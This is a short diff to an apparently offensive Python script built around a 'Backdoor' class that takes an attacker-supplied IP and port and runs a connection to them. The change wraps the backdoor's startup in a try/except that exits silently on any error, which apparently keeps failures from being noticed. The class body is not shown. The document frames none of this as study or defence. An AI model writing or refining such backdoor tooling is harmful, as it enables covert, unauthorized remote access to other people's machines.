@@ -87,7 +87,10 @@ class Backdoor:
 
 options = get_arguments()
 
-my_backdoor = Backdoor(options.ip, options.port)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor(options.ip, options.port)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
 
 print(f'Got a connection from: {options.ip}:{options.port}')
